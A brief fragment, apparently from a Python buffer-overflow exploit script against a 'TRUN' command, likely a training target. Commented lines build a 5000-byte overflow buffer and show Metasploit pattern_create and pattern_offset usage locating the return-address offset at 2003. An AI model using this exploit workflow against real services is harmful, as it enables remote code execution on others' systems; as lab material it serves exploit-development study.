...
# oflow+="A"*5000
# oflow+= sys.argv[1]	#  ./trun.py $(`locate pattern_create.rb|head -n1` 5000)  # 386F4337
# `locate pattern_offset.rb|head -n 1` 386F4337 5000 # 2003
